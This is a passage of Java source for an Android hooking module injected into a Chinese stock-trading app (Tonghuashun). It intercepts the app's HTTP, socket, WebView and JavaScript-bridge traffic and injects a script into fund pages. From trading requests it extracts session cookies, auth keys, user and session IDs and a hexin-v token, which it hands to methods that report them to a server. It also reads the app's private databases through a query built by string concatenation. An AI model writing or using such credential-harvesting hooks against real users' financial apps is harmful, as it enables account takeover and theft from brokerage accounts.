                + "\",\"reason\":\"THS 11.58.03 obtains broker account data through the trading SDK, not xcs2.db\"}";
    }

    /**
     * 获取数据库状态
     */
    private static String getStockDbStatus() {
        StringBuilder sb = new StringBuilder("{");
        sb.append("\"status\":\"legacy_probe_only\"");

        Object db = getStockDatabase();
        if (db == null) {
            sb.append(",\"database_available\":false");
            sb.append(",\"hint\":\"请在App中打开持仓页面后重试\"");

            // 列出数据库目录内容
            try {
                java.io.File dbDir = new java.io.File("/data/data/com.hexin.plat.android/databases/");
                if (dbDir.exists() && dbDir.isDirectory()) {
                    String[] files = dbDir.list();
                    if (files != null) {
                        sb.append(",\"database_files\":").append(toJsonArray(files));
                    }
                }
            } catch (Throwable ignored) {}
        } else {
            sb.append(",\"database_available\":true");

            // 列出表
            try {
                String tablesSql = "SELECT name FROM sqlite_master WHERE type='table' ORDER BY name";
                Method rawQuery = db.getClass().getMethod("rawQuery", String.class, String[].class);
                Object cursor = rawQuery.invoke(db, tablesSql, null);

                if (cursor != null) {
                    Method moveToNext = cursor.getClass().getMethod("moveToNext");
                    Method getString = cursor.getClass().getMethod("getString", int.class);

                    sb.append(",\"tables\":[");
                    boolean first = true;
                    while ((boolean) moveToNext.invoke(cursor)) {
                        if (!first) sb.append(",");
                        first = false;
                        String tableName = (String) getString.invoke(cursor, 0);
                        sb.append("\"").append(escapeJson(tableName)).append("\"");
                    }
                    sb.append("]");

                    Method close = cursor.getClass().getMethod("close");
                    close.invoke(cursor);
                }
            } catch (Throwable e) {
                sb.append(",\"tables_error\":\"").append(escapeJson(e.getMessage())).append("\"");
            }
        }

        sb.append("}");
        return sb.toString();
    }

    /**
     * 转换字符串数组为 JSON 数组
     */
    private static String toJsonArray(String[] arr) {
        StringBuilder sb = new StringBuilder("[");
        for (int i = 0; i < arr.length; i++) {
            if (i > 0) sb.append(",");
            sb.append("\"").append(escapeJson(arr[i])).append("\"");
        }
        sb.append("]");
        return sb.toString();
    }

    /**
     * 转义 JSON 字符串
     */
    private static String escapeJson(String s) {
        if (s == null) return "";
        return s.replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\n", "\\n")
                .replace("\r", "\\r")
                .replace("\t", "\\t");
    }

    /**
     * 查询表结构
     */
    private static String queryTableSchema(String tableName) {
        Object db = getStockDatabase();
        if (db == null) {
            return "{\"error\":\"Database not available\"}";
        }

        try {
            String sql;
            if (tableName == null || tableName.isEmpty()) {
                // 列出所有表
                sql = "SELECT name, sql FROM sqlite_master WHERE type='table' ORDER BY name";
            } else {
                // 查询特定表结构
                sql = "PRAGMA table_info(" + tableName + ")";
            }

            return executeStockQuery(sql, null);
        } catch (Throwable e) {
            return "{\"error\":\"" + escapeJson(e.getMessage()) + "\"}";
        }
    }

    /**
     * 列出所有数据库文件
     */
    private static String listDatabases() {
        StringBuilder sb = new StringBuilder("{\"databases\":[");

        try {
            java.io.File dbDir = new java.io.File("/data/data/com.hexin.plat.android/databases/");
            if (dbDir.exists() && dbDir.isDirectory()) {
                java.io.File[] files = dbDir.listFiles();
                boolean first = true;
                if (files != null) {
                    for (java.io.File f : files) {
                        if (!first) sb.append(",");
                        first = false;
                        sb.append("{");
                        sb.append("\"name\":\"").append(escapeJson(f.getName())).append("\"");
                        sb.append(",\"size\":").append(f.length());
                        sb.append(",\"path\":\"").append(escapeJson(f.getAbsolutePath())).append("\"");
                        sb.append("}");
                    }
                }
            }
        } catch (Throwable e) {
            sb.append("{\"error\":\"").append(escapeJson(e.getMessage())).append("\"}");
        }

        sb.append("]}");
        return sb.toString();
    }

    /**
     * 打开指定数据库并列出表
     */
    private static String openAndListTables(String dbPath) {
        StringBuilder sb = new StringBuilder("{");
        sb.append("\"path\":\"").append(escapeJson(dbPath)).append("\"");

        try {
            Class<?> sqliteClass = Class.forName("android.database.sqlite.SQLiteDatabase");
            Method openDatabase = sqliteClass.getMethod("openDatabase",
                String.class,
                Class.forName("android.database.sqlite.SQLiteDatabase$CursorFactory"),
                int.class
            );

            // OPEN_READONLY = 1
            Object db = openDatabase.invoke(null, dbPath, null, 1);
            if (db == null) {
                sb.append(",\"error\":\"Failed to open database\"");
                sb.append("}");
                return sb.toString();
            }

            // 设置为当前股票数据库
            stockDatabase = db;
            sb.append(",\"database_set\":true");

            // 查询表列表
            Method rawQuery = db.getClass().getMethod("rawQuery", String.class, String[].class);
            Object cursor = rawQuery.invoke(db, "SELECT name, sql FROM sqlite_master WHERE type='table' ORDER BY name", null);

            if (cursor != null) {
                Method moveToNext = cursor.getClass().getMethod("moveToNext");
                Method getString = cursor.getClass().getMethod("getString", int.class);

                sb.append(",\"tables\":[");
                boolean first = true;
                while ((boolean) moveToNext.invoke(cursor)) {
                    if (!first) sb.append(",");
                    first = false;
                    String tableName = (String) getString.invoke(cursor, 0);
                    String createSql = (String) getString.invoke(cursor, 1);
                    sb.append("{");
                    sb.append("\"name\":\"").append(escapeJson(tableName)).append("\"");
                    if (createSql != null) {
                        sb.append(",\"sql\":\"").append(escapeJson(createSql)).append("\"");
                    }
                    sb.append("}");
                }
                sb.append("]");

                Method close = cursor.getClass().getMethod("close");
                close.invoke(cursor);
            }
        } catch (Throwable e) {
            sb.append(",\"error\":\"").append(escapeJson(e.getMessage())).append("\"");
        }

        sb.append("}");
        return sb.toString();
    }

    /**
     * Hook HttpURLConnection 捕获非OkHttp的HTTP请求（券商SDK可能使用）
     */
    private static void hookHttpURLConnection() throws Throwable {
        // Hook URL.openConnection()
        Class<?> urlClass = Class.forName("java.net.URL");
        Method openConn = urlClass.getDeclaredMethod("openConnection");
        Pine.hook(openConn, new MethodHook() {
            @Override
            public void afterCall(Pine.CallFrame callFrame) {
                try {
                    Object conn = callFrame.getResult();
                    if (conn != null) {
                        java.net.URL url = (java.net.URL) callFrame.thisObject;
                        String urlStr = url.toString();
                        // 过滤掉静态资源
                        if (!urlStr.endsWith(".js") && !urlStr.endsWith(".css") && !urlStr.endsWith(".png")
                            && !urlStr.endsWith(".jpg") && !urlStr.endsWith(".gif") && !urlStr.endsWith(".ico")
                            && !urlStr.contains("apm.") && !urlStr.contains("stat.")) {
                            Log.i(TAG, "URLConnection.open → " + urlStr);
                        }
                    }
                } catch (Throwable e) { /* ignore */ }
            }
        });

        // Hook HttpURLConnection.getInputStream() - 捕获响应
        try {
            Class<?> httpConnClass = Class.forName("java.net.HttpURLConnection");
            Method getInput = httpConnClass.getDeclaredMethod("getInputStream");
            Pine.hook(getInput, new MethodHook() {
                @Override
                public void beforeCall(Pine.CallFrame callFrame) {
                    try {
                        java.net.HttpURLConnection conn = (java.net.HttpURLConnection) callFrame.thisObject;
                        String urlStr = conn.getURL().toString();
                        int code = conn.getResponseCode();
                        // 只记录交易相关的请求
                        if (urlStr.contains("trade") || urlStr.contains("stock") || urlStr.contains("broker")
                            || urlStr.contains("order") || urlStr.contains("position") || urlStr.contains("asset")
                            || urlStr.contains("ccsc") || urlStr.contains("川财") || urlStr.contains("hexin")) {
                            Log.i(TAG, "HttpURLConnection ← " + code + " " + urlStr);
                        }
                    } catch (Throwable e) { /* ignore */ }
                }
            });
        } catch (Throwable e) {
            Log.w(TAG, "HttpURLConnection.getInputStream hook failed: " + e.getMessage());
        }

        // Hook Socket.connect() - 捕获TCP连接（股票交易可能用私有协议）
        try {
            Class<?> socketClass = Class.forName("java.net.Socket");
            for (Method m : socketClass.getDeclaredMethods()) {
                if ("connect".equals(m.getName())) {
                    Pine.hook(m, new MethodHook() {
                        @Override
                        public void beforeCall(Pine.CallFrame callFrame) {
                            try {
                                Object addr = callFrame.args[0];
                                if (addr != null) {
                                    String addrStr = addr.toString();
                                    // 过滤掉已知的行情端口，只记录可能的交易端口
                                    if (!addrStr.contains(":443") && !addrStr.contains(":80")
                                        && !addrStr.contains(":8080") && !addrStr.contains(":27042")) {
                                        Log.i(TAG, "Socket.connect → " + addrStr);
                                    }
                                }
                            } catch (Throwable e) { /* ignore */ }
                        }
                    });
                    break;
                }
            }
        } catch (Throwable e) {
            Log.w(TAG, "Socket.connect hook failed: " + e.getMessage());
        }

        Log.i(TAG, "HttpURLConnection/Socket hooks installed");
    }

    /**
     * Hook WebViewClient.shouldInterceptRequest 捕获 WebView 内所有网络请求 URL
     */
    private static void hookWebViewRequests() throws Throwable {
        Class<?> webViewClass = Class.forName("android.webkit.WebView");

        Method loadUrl = webViewClass.getDeclaredMethod("loadUrl", String.class);
        Pine.hook(loadUrl, new MethodHook() {
            @Override
            public void beforeCall(Pine.CallFrame callFrame) {
                final Object webView = callFrame.thisObject;
                String url = (String) callFrame.args[0];
                Log.i(TAG, "WebView.loadUrl → " + url);

                // 保存 WebView 引用
                if (webView != null) {
                    latestWebView = webView;
                }

                // 如果是 fund 页面，延迟注入 XHR Hook
                if (url != null && (url.contains("trade.5ifund.com") || url.contains("/fund/"))) {
                    new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            try {
                                Log.i(TAG, "Injecting XHR Hook into fund page...");
                                Method evalJs = webView.getClass().getDeclaredMethod("evaluateJavascript",
                                        String.class, Class.forName("android.webkit.ValueCallback"));
                                evalJs.invoke(webView, XHR_HOOK_SCRIPT, null);
                                Log.i(TAG, "✓ XHR Hook injected");
                            } catch (Throwable e) {
                                Log.e(TAG, "Failed to inject XHR Hook", e);
                            }
                        }
                    }, 1000); // 延迟 1 秒等待页面加载
                }
            }
        });

        // Hook postUrl
        try {
            Method postUrl = webViewClass.getDeclaredMethod("postUrl", String.class, byte[].class);
            Pine.hook(postUrl, new MethodHook() {
                @Override
                public void beforeCall(Pine.CallFrame callFrame) {
                    String url = (String) callFrame.args[0];
                    Log.i(TAG, "WebView.postUrl → " + url);
                }
            });
        } catch (Throwable e) { /* ignore */ }

        // Hook loadData - 可能基金页面用这个加载
        try {
            Method loadData = webViewClass.getDeclaredMethod("loadData", String.class, String.class, String.class);
            Pine.hook(loadData, new MethodHook() {
                @Override
                public void beforeCall(Pine.CallFrame callFrame) {
                    final Object webView = callFrame.thisObject;
                    String data = (String) callFrame.args[0];
                    Log.i(TAG, "WebView.loadData → [" + data.length() + " chars]");

                    if (webView != null) {
                        latestWebView = webView;
                    }

                    // 延迟注入 XHR Hook（基金页面可能在这里加载）
                    new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            try {
                                Log.i(TAG, "Injecting XHR Hook (after loadData)...");
                                Method evalJs = webView.getClass().getDeclaredMethod("evaluateJavascript",
                                        String.class, Class.forName("android.webkit.ValueCallback"));
                                evalJs.invoke(webView, XHR_HOOK_SCRIPT, null);
                                Log.i(TAG, "✓ XHR Hook injected (loadData)");
                            } catch (Throwable e) {
                                Log.e(TAG, "Failed to inject XHR Hook (loadData)", e);
                            }
                        }
                    }, 2000); // 延迟 2 秒
                }
            });
        } catch (Throwable e) { /* ignore */ }

        // Hook loadDataWithBaseURL - 更常用的方法
        try {
            Method loadDataWithBaseURL = webViewClass.getDeclaredMethod("loadDataWithBaseURL",
                    String.class, String.class, String.class, String.class, String.class);
            Pine.hook(loadDataWithBaseURL, new MethodHook() {
                @Override
                public void beforeCall(Pine.CallFrame callFrame) {
                    final Object webView = callFrame.thisObject;
                    String baseUrl = (String) callFrame.args[0];
                    String data = (String) callFrame.args[1];
                    Log.i(TAG, "WebView.loadDataWithBaseURL → baseUrl=" + baseUrl + " [" + data.length() + " chars]");

                    if (webView != null) {
                        latestWebView = webView;
                    }

                    // 延迟注入 XHR Hook
                    new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            try {
                                Log.i(TAG, "Injecting XHR Hook (after loadDataWithBaseURL)...");
                                Method evalJs = webView.getClass().getDeclaredMethod("evaluateJavascript",
                                        String.class, Class.forName("android.webkit.ValueCallback"));
                                evalJs.invoke(webView, XHR_HOOK_SCRIPT, null);
                                Log.i(TAG, "✓ XHR Hook injected (loadDataWithBaseURL)");
                            } catch (Throwable e) {
                                Log.e(TAG, "Failed to inject XHR Hook (loadDataWithBaseURL)", e);
                            }
                        }
                    }, 2000); // 延迟 2 秒
                }
            });
        } catch (Throwable e) { /* ignore */ }

        try {
            Method evalJs = webViewClass.getDeclaredMethod("evaluateJavascript", String.class,
                    Class.forName("android.webkit.ValueCallback"));
            Pine.hook(evalJs, new MethodHook() {
                private final AtomicInteger evalCounter = new AtomicInteger(0);
                @Override
                public void beforeCall(Pine.CallFrame callFrame) {
                    // 保存 WebView 引用
                    Object webView = callFrame.thisObject;
                    if (webView != null) {
                        latestWebView = webView;
                    }

                    String js = (String) callFrame.args[0];
                    if (js.length() < 500) {
                        Log.i(TAG, "WebView.evalJS → " + js);
                    } else {
                        int idx = evalCounter.incrementAndGet();
                        Log.i(TAG, "WebView.evalJS #" + idx + " [" + js.length() + " chars] START");
                        for (int i = 0; i < js.length(); i += 3000) {
                            int end = Math.min(i + 3000, js.length());
                            Log.i(TAG, "WebView.evalJS #" + idx + " [" + i + "-" + end + "] " + js.substring(i, end));
                        }
                        Log.i(TAG, "WebView.evalJS #" + idx + " END");
                    }
                }
            });
        } catch (Throwable e) { /* ignore */ }

        Class<?> webViewClientClass = Class.forName("android.webkit.WebViewClient");
        Class<?> webResourceRequestClass = Class.forName("android.webkit.WebResourceRequest");
        Method shouldIntercept = webViewClientClass.getDeclaredMethod(
                "shouldInterceptRequest", webViewClass, webResourceRequestClass);
        Pine.hook(shouldIntercept, new MethodHook() {
            @Override
            public void beforeCall(Pine.CallFrame callFrame) {
                try {
                    Object request = callFrame.args[1];
                    Method getUrl = request.getClass().getMethod("getUrl");
                    Object uri = getUrl.invoke(request);
                    String url = uri.toString();
                    if (!url.endsWith(".js") && !url.endsWith(".css") && !url.endsWith(".png")
                            && !url.endsWith(".jpg") && !url.endsWith(".gif") && !url.endsWith(".woff")
                            && !url.endsWith(".ttf") && !url.contains(".ico")
                            && !url.startsWith("data:")) {
                        Log.i(TAG, "WebView.intercept → " + url);
                    }
                } catch (Throwable e) { /* ignore */ }
            }
        });
    }

    /**
     * 注入 OkHttp Interceptor，捕获所有 HTTP 请求和响应
     */
    private static void injectInterceptor(ClassLoader cl) throws Throwable {
        Class<?> builderClass = cl.loadClass("okhttp3.OkHttpClient$Builder");
        Method buildMethod = builderClass.getDeclaredMethod("build");

        Pine.hook(buildMethod, new MethodHook() {
            @Override
            public void beforeCall(Pine.CallFrame callFrame) {
                try {
                    Object builder = callFrame.thisObject;
                    ClassLoader bcl = builder.getClass().getClassLoader();

                    Class<?> interceptorClass = bcl.loadClass("okhttp3.Interceptor");
                    Class<?> chainClass = bcl.loadClass("okhttp3.Interceptor$Chain");

                    // 创建代理 Interceptor
                    Object interceptor = Proxy.newProxyInstance(
                        bcl,
                        new Class<?>[]{ interceptorClass },
                        new InterceptorHandler(chainClass)
                    );

                    // 保存 interceptor ID 到 ThreadLocal
                    pendingInterceptorId.set(System.identityHashCode(interceptor));

                    Method addInterceptor = builder.getClass().getDeclaredMethod("addInterceptor", interceptorClass);
                    addInterceptor.invoke(builder, interceptor);

                    Log.i(TAG, "Interceptor injected into OkHttpClient.Builder");
                } catch (Throwable e) {
                    Log.e(TAG, "Failed to inject interceptor: " + e.getMessage());
                }
            }

            @Override
            public void afterCall(Pine.CallFrame callFrame) {
                // 捕获 OkHttpClient 实例并关联到 interceptor
                Object client = callFrame.getResult();
                if (client != null) {
                    allClients.add(client);
                    Integer interceptorId = pendingInterceptorId.get();
                    if (interceptorId != null) {
                        interceptorClientMap.put(interceptorId, client);
                        pendingInterceptorId.remove();
                    }
                    Log.i(TAG, "OkHttpClient captured #" + allClients.size());
                }
            }
        });

        Log.i(TAG, "OkHttp interceptor hook installed");
    }

    /**
     * OkHttp Interceptor 处理器
     */
    static class InterceptorHandler implements InvocationHandler {
        private final Class<?> chainClass;

        InterceptorHandler(Class<?> chainClass) {
            this.chainClass = chainClass;
        }

        @Override
        public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
            if (!"intercept".equals(method.getName())) {
                if ("toString".equals(method.getName())) return "THSHook-Interceptor";
                if ("hashCode".equals(method.getName())) return System.identityHashCode(proxy);
                if ("equals".equals(method.getName())) return proxy == args[0];
                return null;
            }

            Object chain = args[0];

            // 获取 request
            Method requestMethod = chainClass.getDeclaredMethod("request");
            Object request = requestMethod.invoke(chain);

            Object url = request.getClass().getDeclaredMethod("url").invoke(request);
            String urlStr = url.toString();
            String httpMethod = (String) request.getClass().getDeclaredMethod("method").invoke(request);

            // 捕获域名特定的 OkHttpClient
            // 当 interceptor 处理请求时，通过 interceptor identity → client 映射找到对应的 OkHttpClient
            String domain = extractDomain(urlStr);
            if (domain != null && !domainClients.containsKey(domain)) {
                int myId = System.identityHashCode(proxy);
                Object myClient = interceptorClientMap.get(myId);
                if (myClient != null) {
                    domainClients.put(domain, myClient);
                    Log.i(TAG, "Domain client mapped: " + domain + " → client#" + allClients.indexOf(myClient));
                }
            }

            // 从 trade.5ifund.com 请求中提取 auth 参数
            if (urlStr.contains("trade.5ifund.com")) {
                try {
                    // 如果URL包含 key5 参数，提取它
                    if (urlStr.contains("key5=")) {
                        int k5Start = urlStr.indexOf("key5=") + 5;
                        int k5End = urlStr.indexOf("&", k5Start);
                        if (k5End == -1) k5End = urlStr.length();
                        String key5Value = urlStr.substring(k5Start, k5End);
                        if (key5Value.length() > 10) {
                            latestKey5 = key5Value;
                            authCaptureTime = System.currentTimeMillis();
                            Log.i(TAG, "Auth captured from URL: key5 len=" + key5Value.length());
                            reportAuthToServer();
                        }
                    }

                    // 无论是否有 key5，都尝试提取 headers（因为 key5 可能通过 cipher 捕获）
                    Object headers = request.getClass().getDeclaredMethod("headers").invoke(request);
                    String headerStr = headers.toString();

                    // 提取 Cookie
                    int cookieIdx = headerStr.toLowerCase().indexOf("cookie:");
                    if (cookieIdx != -1) {
                        int valStart = cookieIdx + 7;
                        int valEnd = headerStr.indexOf("\n", valStart);
                        if (valEnd == -1) valEnd = headerStr.length();
                        String newCookie = headerStr.substring(valStart, valEnd).trim();
                        if (newCookie.length() > 0) {
                            latestCookie = newCookie;
                            Log.i(TAG, "Cookie captured, len=" + latestCookie.length());

                            // 提取问财 hexin-v token（Cookie 中的 v= 字段）
                            int vIdx = newCookie.indexOf("; v=");
                            if (vIdx == -1) vIdx = newCookie.indexOf("v=");
                            if (vIdx != -1) {
                                int vStart = newCookie.indexOf("=", vIdx) + 1;
                                int vEnd = newCookie.indexOf(";", vStart);
                                if (vEnd == -1) vEnd = newCookie.length();
                                String vValue = newCookie.substring(vStart, vEnd).trim();
                                if (vValue.length() > 20) { // v token 通常 60+ 字符
                                    latestHexinV = vValue;
                                    Log.i(TAG, "hexin-v captured from cookie, len=" + vValue.length());
                                    reportHexinVToServer();
                                }
                            }
                        }
                    }

                    // 提取 key1-key4, userId, sessionId
                    String[] authKeys = {"key1", "key2", "key3", "key4", "userId", "sessionId"};
                    for (String key : authKeys) {
                        int keyIdx = headerStr.indexOf(key + ":");
                        if (keyIdx != -1) {
                            int valStart = keyIdx + key.length() + 1;
                            int valEnd = headerStr.indexOf("\n", valStart);
                            if (valEnd == -1) valEnd = headerStr.length();
                            String value = headerStr.substring(valStart, valEnd).trim();
                            if (value.length() > 0) {
                                switch (key) {
                                    case "key1": latestKey1 = value; break;
                                    case "key2": latestKey2 = value; break;
                                    case "key3": latestKey3 = value; break;
                                    case "key4": latestKey4 = value; break;
                                    case "userId": latestUserId = value; break;
                                    case "sessionId": latestSessionId = value; break;
                                }
                                Log.i(TAG, key + " captured, len=" + value.length());
                            }
                        }
                    }
                } catch (Throwable e) {
                    Log.w(TAG, "Auth capture failed: " + e.getMessage());
                }
            }

            // 从任何 10jqka.com.cn 请求中提取问财 hexin-v token
            if (latestHexinV == null && urlStr.contains("10jqka.com.cn")) {
                try {
                    Object headers = request.getClass().getDeclaredMethod("headers").invoke(request);
                    String headerStr = headers.toString();
                    int cookieIdx = headerStr.toLowerCase().indexOf("cookie:");
                    if (cookieIdx != -1) {
                        int valStart = cookieIdx + 7;
                        int valEnd = headerStr.indexOf("\n", valStart);
                        if (valEnd == -1) valEnd = headerStr.length();
                        String cookieStr = headerStr.substring(valStart, valEnd).trim();
                        int vIdx = cookieStr.indexOf("; v=");
                        if (vIdx == -1 && cookieStr.startsWith("v=")) vIdx = 0;
                        if (vIdx != -1) {
                            int vStart = cookieStr.indexOf("=", vIdx) + 1;
                            int vEnd = cookieStr.indexOf(";", vStart);
                            if (vEnd == -1) vEnd = cookieStr.length();
                            String vValue = cookieStr.substring(vStart, vEnd).trim();
                            if (vValue.length() > 20) {
                                latestHexinV = vValue;
                                Log.i(TAG, "hexin-v captured from 10jqka cookie, len=" + vValue.length());
                                reportHexinVToServer();
                            }
                        }
                    }
                } catch (Throwable e) {
                    Log.w(TAG, "hexin-v capture failed: " + e.getMessage());
                }
            }

            // 日志限流
            long now = System.currentTimeMillis();
            if (now - httpLogWindowStart > 10000) {
                httpLogCount.set(0);
                httpLogWindowStart = now;
            }
            boolean etfFundPoolRequest = urlStr.contains(
                    "/quotation/fund_pool/v2/query");
            boolean shouldLog = (SENSITIVE_PAYLOAD_LOGGING || etfFundPoolRequest)
                && httpLogCount.incrementAndGet() <= HTTP_LOG_LIMIT;

            if (shouldLog) {
                Log.i(TAG, "→ " + httpMethod + " " + urlStr);

                // 记录请求头
                try {
                    Object headers = request.getClass().getDeclaredMethod("headers").invoke(request);
                    String headerStr = headers.toString();
                    if (urlStr.contains("trade.5ifund.com")) {
                        for (int si = 0; si < headerStr.length(); si += 3000) {
                            int end = Math.min(si + 3000, headerStr.length());
                            Log.i(TAG, "  ReqHeaders[" + si + "-" + end + "]: " + headerStr.substring(si, end));
                        }
                    } else {
                        if (headerStr.length() > 500) headerStr = headerStr.substring(0, 500) + "...";
                        Log.i(TAG, "  ReqHeaders: " + headerStr);
                    }
                } catch (Throwable ignored) {}

                // 记录请求体
                try {
                    Object body = request.getClass().getDeclaredMethod("body").invoke(request);
                    if (body != null) {
                        String bodyType = body.getClass().getName();
                        Log.i(TAG, "  ReqBodyType: " + bodyType);
                        try {
                            if (bodyType.contains("FormBody")) {
                                Method sizeM = body.getClass().getDeclaredMethod("size");
                                int size = (int) sizeM.invoke(body);
                                StringBuilder sb = new StringBuilder();
                                Method nameM = body.getClass().getDeclaredMethod("name", int.class);
                                Method valueM = body.getClass().getDeclaredMethod("value", int.class);
                                for (int i = 0; i < Math.min(size, 20); i++) {
                                    if (sb.length() > 0) sb.append("&");
                                    sb.append(nameM.invoke(body, i)).append("=").append(valueM.invoke(body, i));
                                }
                                Log.i(TAG, "  ReqBody: " + sb.toString());
                            } else {
                                ClassLoader bcl = body.getClass().getClassLoader();
                                Class<?> bufferClass = bcl.loadClass("okio.Buffer");
                                Object buffer = bufferClass.getDeclaredConstructor().newInstance();
                                Method writeTo = body.getClass().getMethod("writeTo", bcl.loadClass("okio.BufferedSink"));
                                writeTo.invoke(body, buffer);
                                String bodyStr = (String) buffer.getClass().getMethod("readUtf8").invoke(buffer);
                                if (bodyStr != null && bodyStr.length() > 0) {
                                    if (bodyStr.length() > 1000) bodyStr = bodyStr.substring(0, 1000) + "...";
                                    Log.i(TAG, "  ReqBody: " + bodyStr);
                                }
                            }
                        } catch (Throwable ignored) {}
                    }
                } catch (Throwable ignored) {}
            }

            // 执行请求
            Method proceedMethod = chainClass.getDeclaredMethod("proceed", request.getClass().getClassLoader().loadClass("okhttp3.Request"));
            Object response = proceedMethod.invoke(chain, request);

            if (shouldLog) {
                try {
                    int code = (int) response.getClass().getDeclaredMethod("code").invoke(response);
                    Log.i(TAG, "← " + code + " " + urlStr);

                    Object responseBody = response.getClass().getDeclaredMethod("body").invoke(response);
                    if (responseBody != null) {
                        Object contentType = responseBody.getClass().getDeclaredMethod("contentType").invoke(responseBody);
                        String ctStr = contentType != null ? contentType.toString() : "";

                        if (ctStr.contains("json") || ctStr.contains("text") || ctStr.contains("html") || ctStr.contains("xml")) {
                            try {
                                Object source = responseBody.getClass().getMethod("source").invoke(responseBody);
                                if (source != null) {
                                    try {
                                        Method reqBytes = source.getClass().getMethod("request", long.class);
                                        reqBytes.invoke(source, 65536L);
                                    } catch (Throwable ignored) {}

                                    Method bufferMethod = null;
                                    try { bufferMethod = source.getClass().getMethod("getBuffer"); }
                                    catch (Throwable e1) {
                                        try { bufferMethod = source.getClass().getMethod("buffer"); }
                                        catch (Throwable e2) {}
                                    }
                                    if (bufferMethod != null) {
                                        Object buffer = bufferMethod.invoke(source);
                                        Object cloned = buffer.getClass().getMethod("clone").invoke(buffer);
                                        String bodyStr = (String) cloned.getClass().getMethod("readUtf8").invoke(cloned);
                                        if (bodyStr != null && bodyStr.length() > 0) {
                                            if (bodyStr.length() > 2000) bodyStr = bodyStr.substring(0, 2000) + "...[truncated]";
                                            Log.i(TAG, "  RespBody: " + bodyStr);
                                        }
                                    }
                                }
                            } catch (Throwable e) {
                                Log.w(TAG, "  RespBody read failed: " + e.getMessage());
                            }
                        } else {
                            Log.i(TAG, "  RespType: " + ctStr + " (binary, skipped)");
                        }
                    }
                } catch (Throwable e) {
                    Log.w(TAG, "  Response log failed: " + e.getMessage());
                }
            }

            return response;
        }
    }

    /**
     * Hook WebView.addJavascriptInterface 发现 JS-Java 桥接对象
     * 并监控 @JavascriptInterface 方法调用
     */
    private static void hookJSBridgeNative() throws Throwable {
        Class<?> webViewClass = Class.forName("android.webkit.WebView");
        Method addJsInterface = webViewClass.getDeclaredMethod("addJavascriptInterface", Object.class, String.class);

        Pine.hook(addJsInterface, new MethodHook() {
            @Override
            public void beforeCall(Pine.CallFrame callFrame) {
                try {
                    Object jsInterface = callFrame.args[0];
                    String name = (String) callFrame.args[1];
                    String className = jsInterface.getClass().getName();
                    Log.i(TAG, "WebView.addJavascriptInterface: name=" + name + " class=" + className);

                    if (className.contains("WebViewJavaScriptBridgePlus$")) {
                        hookWebViewBridgeResolver(jsInterface);
                    }

                    // 如果是 ClientRequestHX，深度 Hook 所有方法
                    if (className.contains("ClientRequestHX")) {
                        Log.i(TAG, "=== Detected ClientRequestHX! Deep hooking all methods ===");
                        deepHookClientRequestHX(jsInterface);
                    }

                    // 枚举所有带 @JavascriptInterface 注解的方法
                    for (Method m : jsInterface.getClass().getDeclaredMethods()) {
                        try {
                            if (m.isAnnotationPresent(Class.forName("android.webkit.JavascriptInterface").asSubclass(java.lang.annotation.Annotation.class))) {
                                Log.i(TAG, "  @JavascriptInterface: " + m.getName() + " " + java.util.Arrays.toString(m.getParameterTypes()));

                                // Hook 该方法以监控调用
                                Pine.hook(m, new MethodHook() {
                                    @Override
                                    public void beforeCall(Pine.CallFrame frame) {
                                        StringBuilder sb = new StringBuilder();
                                        sb.append("JSBridge.").append(name).append(".").append(m.getName()).append("(");
                                        if (frame.args != null) {
                                            for (int i = 0; i < frame.args.length; i++) {
                                                if (i > 0) sb.append(", ");
                                                Object arg = frame.args[i];
                                                if (arg == null) {
                                                    sb.append("null");
                                                } else if (arg instanceof String) {
                                                    String s = (String) arg;

                                                    // 特殊处理 onActionEvent 中的 clientRequestHX
                                                    if (m.getName().equals("onActionEvent") && s.contains("clientRequestHX")) {
                                                        // 尝试拦截并用 Native HTTP 处理
                                                        String result = interceptClientRequestHX(s, frame.thisObject);
                                                        if (result != null) {
                                                            // 成功拦截，阻止原始方法执行
                                                            Log.i(TAG, ">>> INTERCEPTED clientRequestHX, handled natively");
                                                            frame.setResult(null);
                                                            return;
                                                        }
                                                        // 提取认证参数（如果没有拦截）
                                                        if (s.contains("trade.5ifund.com")) {
                                                            extractAuthFromJSBridge(s);
                                                        }
                                                    }

                                                    // 捕获购买相关的JSBridge调用
                                                    if (s.contains("fundBuy") || s.contains("subscribe") || s.contains("purchase")) {
                                                        Log.i(TAG, ">>> CAPTURE: Detected buy-related JSBridge call");
                                                        // 保存当前的JSBridge handler实例
                                                        jsBridgeHandler = frame.thisObject;
                                                    }

                                                    if (s.length() > 500) {
                                                        sb.append("\"").append(s.substring(0, 500)).append("...[").append(s.length()).append("]\"");
                                                    } else {
                                                        sb.append("\"").append(s).append("\"");
                                                    }
                                                } else {
                                                    sb.append(arg);
                                                }
                                            }
                                        }
                                        sb.append(")");
                                        Log.i(TAG, sb.toString());
                                    }

                                    @Override
                                    public void afterCall(Pine.CallFrame frame) {
                                        Object result = frame.getResult();
                                        if (result != null) {
                                            String resultStr = result.toString();
                                            if (resultStr.length() > 1000) {
                                                resultStr = resultStr.substring(0, 1000) + "...[" + resultStr.length() + "]";
                                            }
                                            Log.i(TAG, "  → " + resultStr);
                                        }
                                    }
                                });
                            }
                        } catch (Throwable ignored) {}
                    }
                } catch (Throwable e) {
                    Log.w(TAG, "addJavascriptInterface hook error: " + e.getMessage());
                }
            }
        });

        Log.i(TAG, "JSBridge native hook installed");
    }

    /**
     * 记录 WebView handler 到实际 JavaScriptInterface 实现类的运行时映射。
     * 同花顺会通过插件 Map 动态注入行情 handler，静态 DEX 只能看到 handler 名称，
     * 无法确认最终执行类，因此必须在 getJavaScriptInterface() 返回后观测。
     */
    private static synchronized void hookWebViewBridgeResolver(Object exposedJsInterface) {
        try {
            java.lang.reflect.Field outerField = exposedJsInterface.getClass().getDeclaredField("this$0");
            outerField.setAccessible(true);
            Object bridge = outerField.get(exposedJsInterface);
            if (bridge == null) return;

            Class<?> bridgeClass = bridge.getClass();
            ClassLoader loader = bridgeClass.getClassLoader();
            Class<?> messageClass = Class.forName(
                    "com.hexin.android.webviewjsinterface.WebViewJavaScriptBridgePlus$MessageStruct",
                    false,
                    loader
            );

            if (!webViewBridgeResolverHooked) {
                Method resolver = bridgeClass.getDeclaredMethod("getJavaScriptInterface", messageClass);
                resolver.setAccessible(true);
                Pine.hook(resolver, new MethodHook() {
